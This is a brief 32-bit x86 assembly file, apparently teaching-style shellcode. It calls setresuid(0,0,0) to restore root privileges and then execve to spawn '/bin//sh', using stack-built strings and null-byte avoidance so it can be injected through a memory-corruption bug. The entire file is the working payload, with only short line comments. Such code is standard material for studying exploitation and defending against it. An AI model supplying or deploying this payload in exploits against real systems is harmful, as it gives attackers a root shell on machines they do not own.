BITS 32

;   setresuid(uid_t ruid, uid_t euid, uid_t suid);
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    mov al, 0xa4
    int 0x80            ; setresuid(0,0,0) Restores all root privs

;   execve(const char *fname, char *const argv [], char *const envp[]);
    xor eax, eax
    push eax            ; Push some nulls for string termination
    push 0x68732f2f     ; Push "//sh" to the stack
    push 0x6e69622f     ; Push "/bin" to the stack
    mov ebx, esp        ; Put the address of "/bin//sh" into ebx via esp
    push eax            ; push this 32b null terminator to stack
    mov edx, esp
    push ebx            ; Push string addr to stack above null terminator
    mov ecx, esp        ; This is the argv array with str ptr
    mov al, 11
    int 0x80